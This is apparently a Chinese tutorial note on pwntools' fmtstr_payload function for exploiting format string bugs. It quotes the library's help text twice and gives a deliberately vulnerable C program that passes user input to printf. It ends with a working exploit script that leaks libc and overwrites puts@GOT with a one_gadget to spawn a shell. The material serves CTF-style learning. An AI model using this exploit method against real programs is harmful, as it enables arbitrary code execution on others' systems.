格式化字符串漏洞如果要修改某个内存地址的内容常常需要构造比较长的payload，手撸当然也可以，但比较耗时，容易出错，pwntools里的pwnlib.fmtstr模块用起来比较方便，不容易出错，所以记录一下以便以后能够更快的写exp。

pwntools pwnlib.fmtstr模块提供了一些字符串漏洞利用的工具。该模块中定义了一个类FmtStr和一个函数fmtstr_payload。

FmtStr提供了自动化的字符串漏洞利用。

```python
class pwnlib.fmtstr.FmtStr(execute_fmt, offset=None, padlen=0, numbwritten=0)
```

- execute_fmt(function)：与漏洞进程进行交互的函数；
- offset(int)：控制的第一个格式化程序的偏移量
- padlen(int)：在payload之前添加的pad的大小
- numbwritten(int)：已经写入的字节数



fmtstr_payload用于自动生成格式化字符串payload

```python
pwnlib.fmtstr.fmtstr_payload(offset, writes, numbwritten=0, write_size='byte')
```

- offset(int)：控制的第一个格式化程序的偏移量
- writes(dic)：格式为{addr:value , addr2:value2}，用于往addr里写入value的值
- numbwritten(int)：已经由printf函数写入的字节数
- write_size(str)：必须是byte、short或int。（hhn，hn，n）

fmtstr_payload python文档

```python
Help on function fmtstr_payload in module pwnlib.fmtstr:

fmtstr_payload(offset, writes, numbwritten=0, write_size='byte', write_size_max='long', overflows=16, strategy='small', badbytes=frozenset([]), offset_bytes=0)
    fmtstr_payload(offset, writes, numbwritten=0, write_size='byte') -> str
    
    Makes payload with given parameter.
    It can generate payload for 32 or 64 bits architectures.
    The size of the addr is taken from ``context.bits``
    
    The overflows argument is a format-string-length to output-amount tradeoff:
    Larger values for ``overflows`` produce shorter format strings that generate more output at runtime.
    
    Arguments:
        offset(int): the first formatter's offset you control
        writes(dict): dict with addr, value ``{addr: value, addr2: value2}``
        numbwritten(int): number of byte already written by the printf function
        write_size(str): must be ``byte``, ``short`` or ``int``. Tells if you want to write byte by byte, short by short or int by int (hhn, hn or n)
        overflows(int): how many extra overflows (at size sz) to tolerate to reduce the length of the format string
        strategy(str): either 'fast' or 'small' ('small' is default, 'fast' can be used if there are many writes)
    Returns:
        The payload in order to do needed writes
    
    Examples:
        >>> context.clear(arch = 'amd64')
        >>> fmtstr_payload(1, {0x0: 0x1337babe}, write_size='int')
        b'%322419390c%4$llnaaaabaa\x00\x00\x00\x00\x00\x00\x00\x00'
        >>> fmtstr_payload(1, {0x0: 0x1337babe}, write_size='short')
        b'%47806c%5$lln%22649c%6$hnaaaabaa\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00'
        >>> fmtstr_payload(1, {0x0: 0x1337babe}, write_size='byte')
        b'%190c%7$lln%85c%8$hhn%36c%9$hhn%131c%10$hhnaaaab\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00'
        >>> context.clear(arch = 'i386')
        >>> fmtstr_payload(1, {0x0: 0x1337babe}, write_size='int')
        b'%322419390c%5$na\x00\x00\x00\x00'
        >>> fmtstr_payload(1, {0x0: 0x1337babe}, write_size='short')
        b'%4919c%7$hn%42887c%8$hna\x02\x00\x00\x00\x00\x00\x00\x00'
        >>> fmtstr_payload(1, {0x0: 0x1337babe}, write_size='byte')
        b'%19c%12$hhn%36c%13$hhn%131c%14$hhn%4c%15$hhn\x03\x00\x00\x00\x02\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00'
        >>> fmtstr_payload(1, {0x0: 0x00000001}, write_size='byte')
        b'%1c%3$na\x00\x00\x00\x00'
        >>> fmtstr_payload(1, {0x0: b"\xff\xff\x04\x11\x00\x00\x00\x00"}, write_size='short')
        b'%327679c%7$lln%18c%8$hhn\x00\x00\x00\x00\x03\x00\x00\x00'

```





这里只展示fmtstr_payload使用方法

演示程序(64位)

```c
#include<stdio.h>
#include <unistd.h>
//gcc -o test test.c -fstack-protector -no-pie -z lazy
int main(){
	char temp[0x100];
	while(1){
		puts("input:");
		read(0,temp,0x100);
		printf(temp);
	}
	return 0;
}
```

泄露libcbase之后修改puts_got的内容为one_gadget，当然也可以修改printf_got为system，然后temp再输入"/bin/sh\x00"。这里选择前者。

exp

```python
from pwn import*
context.clear(arch = 'amd64')
context.log_level = 'debug'
def pr(a,addr):
	log.success(a+'===>'+hex(addr))
elf = ELF('./test')
p = process('./test')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
one_gadget = [0x4f3d5,0x4f432,0x10a41c]
puts_got = elf.got['puts']

p.sendafter(':','%41$p')
libcbase = int(p.recvuntil('i')[:-1],16) - 231 - libc.sym['__libc_start_main']
one = libcbase + one_gadget[1]
pr('libcbase',libcbase)
pr('one',one)
#----------------------------------------------------------------------------------
payload = fmtstr_payload(6,{puts_got : one},write_size='short').ljust(0x100,'\x00')
print('fmtstr_payload',payload)
#gdb.attach(p,'b *'+str(one))
p.sendafter(':',payload)
p.interactive()
```





# PS！！！

4.3 version pwntools更新了这个模块

如果地址中有'\x00'会遇到printf的截断

更新之后地址加在了后边

```python
Help on function fmtstr_payload in module pwnlib.fmtstr:

fmtstr_payload(offset, writes, numbwritten=0, write_size='byte', write_size_max='long', overflows=16, strategy='small', badbytes=frozenset([]), offset_bytes=0)
    fmtstr_payload(offset, writes, numbwritten=0, write_size='byte') -> str
    
    Makes payload with given parameter.
    It can generate payload for 32 or 64 bits architectures.
    The size of the addr is taken from ``context.bits``
    
    The overflows argument is a format-string-length to output-amount tradeoff:
    Larger values for ``overflows`` produce shorter format strings that generate more output at runtime.
    
    Arguments:
        offset(int): the first formatter's offset you control
        writes(dict): dict with addr, value ``{addr: value, addr2: value2}``
        numbwritten(int): number of byte already written by the printf function
        write_size(str): must be ``byte``, ``short`` or ``int``. Tells if you want to write byte by byte, short by short or int by int (hhn, hn or n)
        overflows(int): how many extra overflows (at size sz) to tolerate to reduce the length of the format string
        strategy(str): either 'fast' or 'small' ('small' is default, 'fast' can be used if there are many writes)
    Returns:
        The payload in order to do needed writes
    
    Examples:
        >>> context.clear(arch = 'amd64')
        >>> fmtstr_payload(1, {0x0: 0x1337babe}, write_size='int')
        b'%322419390c%4$llnaaaabaa\x00\x00\x00\x00\x00\x00\x00\x00'
        >>> fmtstr_payload(1, {0x0: 0x1337babe}, write_size='short')
        b'%47806c%5$lln%22649c%6$hnaaaabaa\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00'
        >>> fmtstr_payload(1, {0x0: 0x1337babe}, write_size='byte')
        b'%190c%7$lln%85c%8$hhn%36c%9$hhn%131c%10$hhnaaaab\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00'
        >>> context.clear(arch = 'i386')
        >>> fmtstr_payload(1, {0x0: 0x1337babe}, write_size='int')
        b'%322419390c%5$na\x00\x00\x00\x00'
        >>> fmtstr_payload(1, {0x0: 0x1337babe}, write_size='short')
        b'%4919c%7$hn%42887c%8$hna\x02\x00\x00\x00\x00\x00\x00\x00'
        >>> fmtstr_payload(1, {0x0: 0x1337babe}, write_size='byte')
        b'%19c%12$hhn%36c%13$hhn%131c%14$hhn%4c%15$hhn\x03\x00\x00\x00\x02\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00'
        >>> fmtstr_payload(1, {0x0: 0x00000001}, write_size='byte')
        b'%1c%3$na\x00\x00\x00\x00'
        >>> fmtstr_payload(1, {0x0: b"\xff\xff\x04\x11\x00\x00\x00\x00"}, write_size='short')
        b'%327679c%7$lln%18c%8$hhn\x00\x00\x00\x00\x03\x00\x00\x00'

```

